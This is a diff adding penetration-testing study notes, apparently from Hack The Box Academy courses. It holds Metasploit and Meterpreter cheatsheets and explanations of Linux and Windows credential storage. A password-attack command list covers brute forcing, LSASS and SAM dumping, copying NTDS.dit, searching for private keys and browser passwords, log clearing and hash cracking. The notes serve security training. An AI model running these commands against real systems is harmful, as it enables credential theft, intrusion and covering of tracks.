@@ -1619,3 +1619,291 @@ Laudanum is a repository of ready-made files that can be used to inject onto a v
 
 ### Complete
 [Link of Completion](https://academy.hackthebox.com/achievement/713396/115)
+
+## Using the Metasploit Framework
+
+### Cheatsheet
+
+**MSFconsole Commands**
+
+| **Command**        | **Description**                                                  |
+| :--------------- | :----------------------------------------------------------- |
+| `show exploits` | Show all exploits within the Framework.                      |
+| `show payloads`  | Show all payloads within the Framework.                      |
+| `show auxiliary` | Show all auxiliary modules within the Framework.             |
+| `search <name>` | Search for exploits or modules within the Framework.         |
+| `info`         | Load information about a specific exploit or module.         |
+| `use <name>` | Load an exploit or module (example: use windows/smb/psexec). |
+| `use <number>` | Load an exploit by using the index number displayed after the search <name> command. |
+| `LHOST`        | Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells. |
+| `RHOST`        | The remote host or the target. set function Set a specific value (for example, LHOST or RHOST). |
+| `setg <function>` | Set a specific value globally (for example, LHOST or RHOST). |
+| `show options` | Show the options available for a module or exploit.          |
+| `show targets` | Show the platforms supported by the exploit.                 |
+| `set target <number>` | Specify a specific target index if you know the OS and service pack. |
+| `set payload <payload>` | Specify the payload to use. |
+| `set payload <number>` | Specify the payload index number to use after the show payloads command. |
+| `show advanced` | Show advanced options. |
+| `set autorunscript migrate -f` | Automatically migrate to a separate process upon exploit completion. |
+| `check` | Determine whether a target is vulnerable to an attack. |
+| `exploit` | Execute the module or exploit and attack the target. |
+| `exploit -j` | Run the exploit under the context of the job. (This will run the exploit in the background.) |
+| `exploit -z` | Do not interact with the session after successful exploitation. |
+| `exploit -e <encoder>` | Specify the payload encoder to use (example: exploit –e shikata_ga_nai). |
+| `exploit -h` | Display help for the exploit command. |
+| `sessions -l` | List available sessions (used when handling multiple shells). |
+| `sessions -l -v` | List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system. |
+| `sessions -s <script>` | Run a specific Meterpreter script on all Meterpreter live sessions. |
+| `sessions -K` | Kill all live sessions. |
+| `sessions -c <cmd>` | Execute a command on all live Meterpreter sessions. |
+| `sessions -u <sessionID>` | Upgrade a normal Win32 shell to a Meterpreter console. |
+| `db_create <name>` | Create a database to use with database-driven attacks (example: db_create autopwn). |
+| `db_connect <name>` | Create and connect to a database for driven attacks (example: db_connect autopwn). |
+| `db_nmap` | Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.) |
+| `db_destroy` | Delete the current database. |
+| `db_destroy  <user:password@host:port/database>` | Delete database using advanced options. |
+|                |                                                              |
+
+
+----
+**Meterpreter Commands**
+
+| **Command**                                                     | **Description**                                                  |
+| :---------------------------------------------------------- | :----------------------------------------------------------- |
+| `help`                                                      | Open Meterpreter usage help.                                 |
+| `run <scriptname>`                                        | Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory. |
+| `sysinfo`                                                   | Show the system information on the compromised target.       |
+| `ls`                                                        | List the files and folders on the target.                    |
+| `use priv`                                                  | Load the privilege extension for extended Meterpreter libraries. |
+| `ps`                                                        | Show all running processes and which accounts are associated with each process. |
+| `migrate <proc. id>`                                      | Migrate to the specific process ID (PID is the target process ID gained from the ps command). |
+| `use incognito`                                             | Load incognito functions. (Used for token stealing and impersonation on a target machine.) |
+| `list_tokens -u`                                            | List available tokens on the target by user.                 |
+| `list_tokens -g`                                            | List available tokens on the target by group.                |
+| `impersonate_token <DOMAIN_NAMEUSERNAME>`               | Impersonate a token available on the target.                 |
+| `steal_token <proc. id>`                                  | Steal the tokens available for a given process and impersonate that token. |
+| `drop_token`                                                | Stop impersonating the current token.                        |
+| `getsystem`                                                 | Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors. |
+| `shell`                                                     | Drop into an interactive shell with all available tokens.    |
+| `execute -f <cmd.exe> -i`                                 | Execute cmd.exe and interact with it.                        |
+| `execute -f <cmd.exe> -i -t`                              | Execute cmd.exe with all available tokens.                   |
+| `execute -f <cmd.exe> -i -H -t`                           | Execute cmd.exe with all available tokens and make it a hidden process. |
+| `rev2self`                                                  | Revert back to the original user you used to compromise the target. |
+| `reg <command>`                                           | Interact, create, delete, query, set, and much more in the target’s registry. |
+| `setdesktop <number>`                                     | Switch to a different screen based on who is logged in.      |
+| `screenshot`                                                | Take a screenshot of the target’s screen.                    |
+| `upload <filename>`                                       | Upload a file to the target.                                 |
+| `download <filename>`                                     | Download a file from the target.                             |
+| `keyscan_start`                                             | Start sniffing keystrokes on the remote target.              |
+| `keyscan_dump`                                              | Dump the remote keys captured on the target.                 |
+| `keyscan_stop`                                              | Stop sniffing keystrokes on the remote target.               |
+| `getprivs`                                                  | Get as many privileges as possible on the target.            |
+| `uictl enable <keyboard/mouse>`                           | Take control of the keyboard and/or mouse.                   |
+| `background`                                                | Run your current Meterpreter shell in the background.        |
+| `hashdump`                                                  | Dump all hashes on the target. use sniffer Load the sniffer module. |
+| `sniffer_interfaces`                                        | List the available interfaces on the target.                 |
+| `sniffer_dump <interfaceID> pcapname`                     | Start sniffing on the remote target.                         |
+| `sniffer_start <interfaceID> packet-buffer`               | Start sniffing with a specific range for a packet buffer.    |
+| `sniffer_stats <interfaceID>`                             | Grab statistical information from the interface you are sniffing. |
+| `sniffer_stop <interfaceID>`                              | Stop the sniffer.                                            |
+| `add_user <username> <password> -h <ip>`              | Add a user on the remote target.                             |
+| `add_group_user <"Domain Admins"> <username> -h <ip>` | Add a username to the Domain Administrators group on the remote target. |
+| `clearev`                                                   | Clear the event log on the target machine.                   |
+| `timestomp`                                                 | Change file attributes, such as creation date (antiforensics measure). |
+| `reboot`                                                    | Reboot the target machine.                                   |
+|                                                             |                                                              |
+
+### Complete
+[Link of Completion](https://academy.hackthebox.com/achievement/713396/39)
+
+## Password attacks
+
+
+### Credential storage
+
+**Linux**
+
+```sh
+root@htb:~# cat /etc/shadow
+
+...SNIP...
+htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
+
+<username>:<encrypted password>:<day of last change>:<min age>:<max age>:<warning period>:<inactivity period>:<expiration date>:<reserved field>
+```
+
+The type (`id`) is the cryptographic hash method used to encrypt the password. Many different cryptographic hash methods were used in the past and are still used by some systems today.
+
+| ID     | Cryptographic Hash Algorithm |
+|--------|------------------------------|
+| `$1$`    | MD5                          |
+| `$2a$`   | Blowfish                     |
+| `$5$`    | SHA-256                      |
+| `$6$`    | SHA-512                      |
+| `$sha1$` | SHA1crypt                    |
+| `$y$`    | Yescrypt                     |
+| `$gy$`   | Gost-yescrypt                |
+| `$7$`    | Scrypt                       |
+
+
+
+**Windows Authentication Process**
+![windows-auth](images/auth.png)
+
+Local interactive logon is performed by the interaction between the logon process ([WinLogon](https://www.microsoftpressstore.com/articles/article.aspx?p=2228450&seqNum=8) ), the logon user interface process (`LogonUI`), the credential providers, LSASS, one or more authentication packages, and SAM or Active Directory. Authentication packages, in this case, are the Dynamic-Link Libraries (`DLLs`) that perform authentication checks. For example, for non-domain joined and interactive logins, the authentication package `Msv1_0.dll` is used.
+
+`Winlogon` is a trusted process responsible for managing security-related user interactions. These include:
+
+Launching LogonUI to enter passwords at login
+
+Changing passwords
+
+Locking and unlocking the workstation
+
+It relies on credential providers installed on the system to obtain a user's account name or password. Credential providers are `COM` objects that are located in DLLs.
+
+Winlogon is the only process that intercepts login requests from the keyboard sent via an RPC message from Win32k.sys. Winlogon immediately launches the LogonUI application at logon to display the user interface for logon. After Winlogon obtains a user name and password from the credential providers, it calls LSASS to authenticate the user attempting to log in.
+
+**LSASS**
+
+[Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) (`LSASS`) is a collection of many modules and has access to all authentication processes that can be found in `%SystemRoot%\System32\Lsass.exe`. This service is responsible for the local system security policy, user authentication, and sending security audit logs to the `Event log`. In other words, it is the vault for Windows-based operating systems, and we can find a more detailed illustration of the LSASS architecture [here](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760(v=technet.10)?redirectedfrom=MSDN).
+
+| Authentication Package | Description |
+|------------------------|-------------|
+| `Lsasrv.dll`           | The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful. |
+| `Msv1_0.dll`           | Authentication package for local machine logons that don't require custom authentication. |
+| `Samsrv.dll`           | The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs. |
+| `Kerberos.dll`         | Security package loaded by the LSA for Kerberos-based authentication on a machine. |
+| `Netlogon.dll`         | Network-based logon service. |
+| `Ntdsa.dll`            | This library is used to create new records and folders in the Windows registry. |
+
+
+**SAM**
+
+The [Security Account Manager](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748(v=ws.10)?redirectedfrom=MSDN) (`SAM`) is a database file in Windows operating systems that stores users' passwords. It can be used to authenticate local and remote users. SAM uses cryptographic measures to prevent unauthenticated users from accessing the system. User passwords are stored in a hash format in a registry structure as either an `LM` hash or an `NTLM` hash. This file is located in `%SystemRoot%/system32/config/SAM` and is mounted on HKLM/SAM. SYSTEM level permissions are required to view it.
+
+Windows systems can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the Domain Controller (`DC`) must validate the credentials from the Active Directory database (`ntds.dit`), which is stored in `%SystemRoot%\ntds.dit`.
+
+Microsoft introduced a security feature in Windows NT 4.0 to help improve the security of the SAM database against offline software cracking. This is the `SYSKEY` (`syskey.exe`) feature, which, when enabled, partially encrypts the hard disk copy of the SAM file so that the password hash values for all local accounts stored in the SAM are encrypted with a key.
+
+![credmanager](images/sam.png)
+
+**NTDS**
+
+It is very common to come across network environments where Windows systems are joined to a Windows domain. This is common because it makes it easier for admins to manage all the systems owned by their respective organizations (centralized management). In these cases, the Windows systems will send all logon requests to Domain Controllers that belong to the same Active Directory forest. Each Domain Controller hosts a file called `NTDS.dit` that is kept synchronized across all Domain Controllers with the exception of [Read-Only Domain Controllers](https://docs.microsoft.com/en-us/windows/win32/ad/rodc-and-active-directory-schema). NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:
+
+- User accounts (username & password hash)
+- Group accounts
+- Computer accounts
+- Group policy objects
+
+
+
+
+
+
+
+
+### Cheatsheet
+
+**Connecting to Target**
+
+| **Command**| **Description**|
+|-|-|
+| `xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!` | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol. |
+| `evil-winrm -i <ip> -u user -p password`            | Uses Evil-WinRM to establish a Powershell session with a target. |
+| `ssh user@<ip>`                                     | Uses SSH to connect to a target using a specified user.      |
+| `smbclient -U user \\\\<ip>\\SHARENAME`             | Uses smbclient to connect to an SMB share using a specified user. |
+| `python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/` | Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host. |
+
+---
+**Password Mutations**
+
+| **Command**| **Description**|
+|-|-|
+| `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist` | Uses cewl to generate a wordlist based on keywords present on a website. |
+| `hashcat --force password.list -r custom.rule --stdout > mut_password.list` | Uses Hashcat to generate a rule-based word list.             |
+| `./username-anarchy -i /path/to/listoffirstandlastnames.txt` | Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username. |
+| `curl -s https://fileinfo.com/filetypes/compressed \| html2text \| awk '{print tolower($1)}' \| grep "\." \| tee -a compressed_ext.txt` | Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords. |
+
+---
+**Remote Password Attacks**
+
+| **Command**| **Description**|
+|-|-|
+| `crackmapexec winrm <ip> -u user.list -p password.list` | Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified hosted on a target. |
+| `crackmapexec smb <ip> -u "user" -p "password" --shares` | Uses CrackMapExec to enumerate smb shares on a target using a specified set of credentials. |
+| `hydra -L user.list -P password.list <service>://<ip>`       | Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service. |
+| `hydra -l username -P password.list <service>://<ip>`       | Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service. |
+| `hydra -L user.list -p password <service>://<ip>`       | Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service. |
+| `hydra -C <user_pass.list> ssh://<IP>`                       | Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack. |
+| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam` | Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network. |
+| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa` | Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way. |
+| `crackmapexec smb <ip> -u <username> -p <password> --ntds` | Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network. |
+| `evil-winrm -i <ip>  -u  Administrator -H "<passwordhash>"` | Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of `Pass-The-Hash` attack. |
+
+---
+**Windows Local Password Attacks**
+
+
+| **Command**| **Description**|
+|-|-|
+| `tasklist /svc`                                              | A command-line-based utility in Windows used to list running processes. |
+| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml` | Uses Windows command-line based utility findstr to search for the string "password" in many different file type. |
+| `Get-Process lsass`                                          | A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line. |
+| `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full` | Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials. |
+| `pypykatz lsa minidump /path/to/lsassdumpfile`               | Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file. |
+| `reg.exe save hklm\sam C:\sam.save`                          | Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system). |
+| `move sam.save \\<ip>\NameofFileShare`                  | Uses move in Windows to transfer a file to a specified file share over the network. |
+| `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL` | Uses Secretsdump.py to dump password hashes from the SAM database. |
+| `vssadmin CREATE SHADOW /For=C:`                             | Uses Windows command line based tool vssadmin to create a volume shadow copy for `C:`. This can be used to make a copy of NTDS.dit safely. |
+| `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit` | Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of `C:`. |
+
+
+----
+**Linux Local Password Attacks**
+
+| **Command**| **Description**|
+|-|-|
+| `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done` | Script that can be used to find .conf, .config and .cnf files on a Linux system. |
+| `for i in $(find / -name *.cnf 2>/dev/null \| grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null \| grep -v "\#";done` | Script that can be used to find credentials in specified file types. |
+| `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share\|man";done` | Script that can be used to find common database files.       |
+| `find /home/* -type f -name "*.txt" -o ! -name "*.*"`        | Uses Linux-based find command to search for text files.      |
+| `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share";done` | Script that can be used to search for common file types used with scripts. |
+| `for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done` | Script used to look for common types of documents.           |
+| `cat /etc/crontab`                                           | Uses Linux-based cat command to view the contents of crontab in search for credentials. |
+| `ls -la /etc/cron.*/`                                        | Uses Linux-based  ls -la command to list all files that start with `cron` contained in the etc directory. |
+| `grep -rnw "PRIVATE KEY" /* 2>/dev/null \| grep ":1"`        | Uses Linux-based command grep to search the file system for key terms `PRIVATE KEY` to discover SSH keys. |
+| `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null \| grep ":1"`    | Uses Linux-based grep command to search for the keywords `PRIVATE KEY` within files contained in a user's home directory. |
+| `grep -rnw "ssh-rsa" /home/* 2>/dev/null \| grep ":1"`        | Uses Linux-based grep command to search for keywords `ssh-rsa` within files contained in a user's home directory. |
+| `tail -n5 /home/*/.bash*`                                   | Uses Linux-based tail command to search the through bash history files and output the last 5 lines. |
+| `python3 mimipenguin.py`                                     | Runs Mimipenguin.py using python3.                           |
+| `bash mimipenguin.sh`                                       | Runs Mimipenguin.sh using bash.                              |
+| `python2.7 lazagne.py all`                                   | Runs Lazagne.py with all modules using python2.7             |
+| `ls -l .mozilla/firefox/ \| grep default `                    | Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword `default` using grep. |
+| `cat .mozilla/firefox/1bplpd86.default-release/logins.json \| jq .` | Uses Linux-based command cat to search for credentials stored by Firefox in JSON. |
+| `python3.9 firefox_decrypt.py`                               | Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9. |
+| `python3 lazagne.py browsers`                                | Runs Lazagne.py browsers module using Python 3.               |
+
+----
+
+**Cracking Passwords**
+| **Command**| **Description**|
+|-|-|
+| `hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt` | Uses Hashcat to crack NTLM hashes using a specified wordlist. |
+| `hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show` | Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output. |
+| `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes` | Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking. |
+| `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked` | Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked. |
+| ` hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`           | Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file. |
+| `hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked` | Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked. |
+| `ssh2john.pl SSH.private > ssh.hash`         | Runs Ssh2john.pl script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash. |
+| `john ssh.hash --show`                                       | Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal. |
+| `office2john.py Protected.docx > protected-docx.hash`        | Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash. |
+| `john --wordlist=rockyou.txt protected-docx.hash`            | Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash. |
+| `pdf2john.pl PDF.pdf > pdf.hash`                       | Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked. |
+| `john --wordlist=rockyou.txt pdf.hash`                       | Runs John in conjunction with a wordlist to crack a pdf hash. |
+| `zip2john ZIP.zip > zip.hash`                                | Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash. |
+| `john --wordlist=rockyou.txt zip.hash`                       | Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash. |
+| `bitlocker2john -i Backup.vhd > backup.hashes`               | Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes. |
+| `file GZIP.gzip`                                             | Uses the Linux-based file tool to gather file format information. |
+| `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null \| tar xz;done` | Script that runs a for-loop to extract files from an archive. |
